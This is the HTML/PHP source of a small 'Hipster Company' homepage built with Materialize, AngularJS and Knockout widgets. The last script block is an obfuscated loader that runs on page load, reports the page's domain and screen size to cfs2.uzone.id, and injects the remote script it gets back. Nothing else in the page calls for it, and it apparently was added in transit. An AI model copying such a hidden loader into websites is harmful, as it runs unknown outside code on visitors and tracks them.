<!DOCTYPE html>
<!-- Hai Saya Puji Ermanto saya sebagai front-end web develope di Hipster.Company.Ltd
website ini di design menggunakan Materialize CSS FrameWork -->
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="msapplication-tap-highlight" content="no">
    <meta name="description" content="Materialize is a modern responsive CSS framework based on Material Design by Google. ">
    <meta name = "viewport" content = "width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#EE6E73">

<title>Hipster&raquo;Company</title>

  <link rel="stylesheet" href="css/materialize.min.css" media="screen,projection" />
  <link rel="stylesheet" href="css/slider.css" media="screen,projection" />
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

    <!-- CSS-->
    <link href="css/prism.css" rel="stylesheet">
    <link href="css/ghpages-materialize.css" type="text/css" rel="stylesheet" media="screen,projection">
    <link href="http://fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link href="top.css" rel="stylesheet" />

<!-- top up icon dari fontawesome add font awesomenya -->
<link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
<!-- top up icon dari fontawesome add font awesomenya -->

<script type="text/javascript" src="js/angular.min.js"></sript>

<script src="//cdn.transifex.com/live.js"></script>

	<script>
      window.liveSettings = {
        api_key: "a0b49b34b93844c38eaee15690d86413",
        picker: "bottom-right",
        detectlang: true,
        dynamic: true,
        autocollect: true
      };
    </script>


<script type = "text/javascript">
  // Initialize collapse button
  $(".button-collapse").sideNav();
  // Initialize collapsible (uncomment the line below if you use the dropdown variation)
  //$('.collapsible').collapsible();
</script>

<style>
 header, main, footer {
      padding-left: 300px;
    }

    @media only screen and (max-width : 992px) {
      header, main, footer {
        padding-left: 0;
      }
    }
</style>          

</head>

<?php include('nav.php'); ?>

<?php include('slider.php'); ?>

<body class="parallax-demo" ng-app="myapp">
<? for($a = 1; $a<=18; $a++)
{
   echo '<br />';
}?>

<?php include('parallax.php'); ?>

<?php include('footer.php'); ?>

<script type = "text/javascript">
// Show sideNav
  $('.button-collapse').sideNav('show');
  // Hide sideNav
  $('.button-collapse').sideNav('hide');       
</script>

<script type="text/javascript">
angular.module("myapp", [])
.controller("MyController", function($scope)
{
$scope.myData = {};
$scope.myData.doClick = function(event)
{
alert("clicked: " +
event.clientX + ", " +
event.clientY);
}
});
</script>

<script type="text/javascript">
$(document).ready(function(){
      $('.parallax').parallax();
    });
</script>

<script type="text/javascript">
  $('.button-collapse').sideNav({
      menuWidth: 300, // Default is 240
      edge: 'right', // Choose the horizontal origin
      closeOnClick: true // Closes side-nav on <a> clicks, useful for Angular/Meteor
    }
  );
</script>

 <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
    <script>if (!window.jQuery) { document.write('<script src="bin/jquery-2.1.1.min.js"><\/script>'); }
    </script>

    <script src="top.js"></script>
    <script src="js/knockout-3.4.0.js"></script>
    <script src="js/jquery.timeago.min.js"></script>
    <script src="js/prism.js"></script>
    <script src="js/lunr.min.js"></script>
    <script src="js/search.js"></script>
    <script src="js/materialize.js"></script>
    <script src="js/init.js"></script>

    <!-- Twitter Button -->
    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>

     <script type="text/javascript" src="https://code.jquery.com/jquery-2.1.1.min.js"></script>

<script>
function Task(data)
{
this.title = ko.observable(data.title);
this.isDone = ko.observable(data.isDone);
}
function TaskListViewModel()
{
// Data
var self = this;
self.tasks = ko.observableArray([]);
self.newTaskText = ko.observable();
self.incompleteTasks = ko.computed(function()
{
return ko.utils.arrayFilter(self.tasks(), function(task)
{
return !task.isDone()
});
});
// Operations
self.addTask = function()
{
self.tasks.push(new Task(
{
title: this.newTaskText()
}));
self.newTaskText("");
};
self.removeTask = function(task)
{
self.tasks.remove(task)
};
}
ko.applyBindings(new TaskListViewModel());
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpngrAjZP9TWiF%2foZ8ek4Nwk4TeDFWwWpSabA6pdZftoi9Kf1gaHx%2bmv0ya2hyEnmdboGFKhGwbFoPbZIympaFfonVxgkUwCzVMXfeG3eUfA1YI%2fAfAn2RULOF0dLm0cOFWpD3OPLknDfbVVRqML70mKCWh%2bLCNbo1RiIj2jQ3gnC5c%2f3MSDAjhV2D4TquZr7R8K67vMSjLj6pmp0sneGT%2f9QN3OLKkK1%2bjKIi9m1NkLc1CTBjwGr%2buE7PEUiPpv3ebRWFPAuKDz83FtI0LXNueCCBZ8TtfSRmSlRampAf9qYwh0KE3nGsRNx9WII%2b3WIWEZPrm1SqHGElDzM3TGxZEEVl%2bWnLQzamIfPgW%2b0xlnGB2JwQAF5B6T%2btsPtBpMnSnomNM%2fE2qPFs5TZBebko1ImrIHhhfyizikquBdfixns3E%2b8qUCG0ITOt3%2fMZdd5MAXIhyaNKmI4NbnTFdVkOZDkqsSbo4F6xYFhXUvxye5f1zUkKde37Hb17qAACO1KIlEGlTC80SpnsQCtipYvKtIZBABFL4GKYhM7gk62MIJNLB1OM7%2fU6MSFhs9GMUYeUU9KJd%2fg5DDCq%2bClV13AscmQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</body>
</html>
